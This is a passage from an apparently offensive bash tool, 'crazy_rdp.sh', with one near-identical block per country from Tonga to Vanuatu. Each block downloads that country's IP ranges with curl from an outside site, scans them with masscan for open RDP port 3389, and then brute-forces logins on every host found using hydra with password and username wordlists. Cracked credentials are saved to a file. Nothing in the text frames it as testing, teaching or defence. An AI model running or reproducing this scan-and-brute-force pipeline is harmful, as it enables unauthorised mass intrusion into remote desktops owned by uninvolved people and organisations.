./crazy_rdp.sh
fi




else
if [ $country = "184" ]; then
curl http://ipdiapazon.16mb.com/Tonga.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi



else
if [ $country = "185" ]; then
curl http://ipdiapazon.16mb.com/Trinidad.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "186" ]; then
curl http://ipdiapazon.16mb.com/Tunisia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "187" ]; then
curl http://ipdiapazon.16mb.com/Turkey.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "188" ]; then
curl http://ipdiapazon.16mb.com/Turkmenistan.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "189" ]; then
curl http://ipdiapazon.16mb.com/Tuvalu.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "190" ]; then
curl http://ipdiapazon.16mb.com/Uganda.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "191" ]; then
curl http://ipdiapazon.16mb.com/Ukraine.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi



else
if [ $country = "192" ]; then
curl http://ipdiapazon.16mb.com/United.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi



else
if [ $country = "193" ]; then
curl http://ipdiapazon.16mb.com/United_kingdom.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi




else
if [ $country = "194" ]; then
curl http://ipdiapazon.16mb.com/United_states.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi



else
if [ $country = "195" ]; then
curl http://ipdiapazon.16mb.com/Uruguay.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi



else
if [ $country = "196" ]; then
curl http://ipdiapazon.16mb.com/Uzbekistan.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
read -p "Enter login {administrator, admin & etc.} : " loginbrute
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "2" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
hydra -V -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "3" ]; then
read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
hydra -V -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi


if [ $brutmenu = "4" ]; then
echo ""
hydra -V -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
read -p " Press enter to move to the Main menu "

./crazy_rdp.sh
fi



else
if [ $country = "197" ]; then
curl http://ipdiapazon.16mb.com/Vanuatu.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
clear
cat list
echo ""

echo "IP range is saved in a file $PWD/list."

echo ""
echo "Check for open ports 3389. wait.."
echo ""
echo "For Exit scan mode 'CTRL+C'"
echo ""
masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389

echo "Hosts open port 3389 written to the file $PWD/open3389"

echo ""
echo " Getting to the sorting login / password... "
if [ -e hydra.restore ]; then
rm -f hydra.restore 2> /dev/null
fi

echo ""
echo "         Choose sorting method.."
echo "1. Enter your login and specify the path to the password file: "; 
echo "2. Specify the path to the file with the login and password to enter the : ";
echo "3. Specify the path to the file with the usernames and passwords: ";
echo "4.  Proceed to the sorting method by default: ";
read -p "   Menu selection : " brutmenu

if [ $brutmenu = "1" ]; then
